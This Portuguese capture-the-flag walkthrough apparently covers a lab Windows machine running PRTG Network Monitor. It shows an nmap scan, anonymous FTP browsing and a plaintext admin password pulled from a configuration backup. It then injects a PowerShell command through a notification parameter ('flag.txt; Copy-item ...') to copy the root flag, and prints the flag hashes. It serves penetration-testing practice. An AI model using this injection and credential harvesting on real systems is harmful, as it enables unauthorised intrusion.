## Passo a Passo

#### No terminal

```
$ nmap 10.10.10.152

Starting Nmap 7.70 ( https://nmap.org ) at 2019-04-10 10:43 -03
Nmap scan report for 10.10.10.152
Host is up (0.11s latency).
Not shown: 995 closed ports
PORT    STATE SERVICE
**21/tcp   open  ftp**
80/tcp   open  http
135/tcp open  msrpc
139/tcp open  netbios-ssn
445/tcp open  microsoft-ds

Nmap done: 1 IP address (1 host up) scanned in 11.33 seconds
```

**Porta 21 ftp aberta significa que podemos usar o lftp para acessar como Anonymous@host**
```
$ lftp Anonymous@10.10.10.152

$lftp> ls                
02-03-19  12:18AM                           1024 .rnd
02-25-19  10:15PM       <DIR>          inetpub
07-16-16  09:18AM       <DIR>          PerfLogs
02-25-19  10:56PM       <DIR>          Program Files
02-03-19  12:28AM       <DIR>          Program Files (x86)
02-03-19  08:08AM       <DIR>          Users
02-25-19  11:49PM       <DIR>          Windows

$lftp> cd Users/
$lftp> ls

02-25-19  11:44PM       <DIR>          Administrator
04-11-19  11:27AM       <DIR>          Public

$lftp> cd Public/
$lftp> ls

02-03-19  08:05AM       <DIR>          Documents
07-16-16  09:18AM       <DIR>          Downloads
07-16-16  09:18AM       <DIR>          Music
07-16-16  09:18AM       <DIR>          Pictures
04-11-19  11:28AM                           90 tester.txt
**02-03-19  12:35AM                           33 user.txt**
07-16-16  09:18AM       <DIR>          Videos

$lftp> cat user.txt
**dd58ce67b49e15105e88096c8d9255a5**        
33 bytes transferred
```

**user.txt -> dd58ce67b49e15105e88096c8d9255a5**

```
$lftp> ls -a

11-20-16  10:46PM       <DIR>          $RECYCLE.BIN
02-03-19  12:18AM                 1024 .rnd
11-20-16  09:59PM               389408 bootmgr
07-16-16  09:10AM                    1 BOOTNXT
02-03-19  08:05AM       <DIR>          Documents and Settings
02-25-19  10:15PM       <DIR>          inetpub
04-29-19  09:46AM            738197504 pagefile.sys
07-16-16  09:18AM       <DIR>          PerfLogs
02-25-19  10:56PM       <DIR>          Program Files
02-03-19  12:28AM       <DIR>          Program Files (x86)
02-25-19  10:56PM       <DIR>          ProgramData
02-03-19  08:05AM       <DIR>          Recovery
02-03-19  08:04AM       <DIR>          System Volume Information
02-03-19  08:08AM       <DIR>          Users
02-25-19  11:49PM       <DIR>          Windows

$lftp> cd ProgramData/Paessler/PRTG\ Network\ Monitor
$lftp> ls -a

02-03-19  12:40AM       <DIR>          Configuration Auto-Backups
04-29-19  09:47AM       <DIR>          Log Database
02-03-19  12:18AM       <DIR>          Logs (Debug)
02-03-19  12:18AM       <DIR>          Logs (Sensors)
02-03-19  12:18AM       <DIR>          Logs (System)
04-29-19  09:47AM       <DIR>          Logs (Web Server)
04-29-19  09:52AM       <DIR>          Monitoring Database
04-29-19  10:00AM              1214224 PRTG Configuration.dat
02-25-19  10:54PM              1189697 PRTG Configuration.old
07-14-18  03:13AM              1153755 PRTG Configuration.old.bak
04-29-19  09:48AM              1647616 PRTG Graph Data Cache.dat
02-25-19  11:00PM       <DIR>          Report PDFs
02-03-19  12:18AM       <DIR>          System Information Database
02-03-19  12:40AM       <DIR>          Ticket Database
02-03-19  12:18AM       <DIR>          ToDo Database

$lftp> cat PRTG\ Configuration.old.bak
...
<dbpassword>
<!-- User: prtgadmin -->
PrTg@dmin2018
</dbpassword>
...
```

#### No site http://10.10.10.152

Username: prtgadmin
Password: PrTg@dmin2019

Setup -> Notifications -> Editar Notificação -> Ativar Execute Program 

Para rodar o comando no terminal do powershell:
1. Demo exe notification - outfile.ps1
2. Parâmetro:
```
flag.txt; Copy-item "C:\Users\Administrator\Desktop\root.txt" -Destination "C:\Users\Public\flag.txt" -Recurse
```
3. Executar Notificação

4. Em ```$lftp> Users/Public```
```
$ cat flag.txt
```
**root.txt -> 3018977fb944bf1878f75b879fba67cc**
